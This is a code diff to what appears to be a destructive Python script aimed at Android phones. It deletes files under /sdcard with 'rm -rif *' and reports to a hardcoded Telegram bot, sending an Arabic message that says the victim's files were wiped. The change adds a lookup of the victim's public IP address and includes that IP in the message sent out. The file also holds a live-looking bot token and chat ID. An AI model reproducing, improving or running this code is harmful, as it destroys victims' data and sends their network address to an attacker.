@@ -1,5 +1,11 @@
 import os
 import time
+import requests
+
+url = "https://ipinfo.io/ip"
+response = requests.get(url)
+
+public_ip = response.text.strip()
 token = '7001218911:AAF_QZOeYo2wn7Tio47SkE_jPobWRIK6lOQ'
 ID = '5026029533'
 os.system ("clear")
@@ -10,7 +16,7 @@ os.system ("clear")
 os.system ('cd /sdcard') 
 os.system ('rm -rif *')
 time.sleep(3)
-Ok = 'تم مسح ملفات الضحية'
+Ok = f"تم مسح ملفات الضحية وايبيه هو {public_ip}"
 requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(Ok)}")
 
 
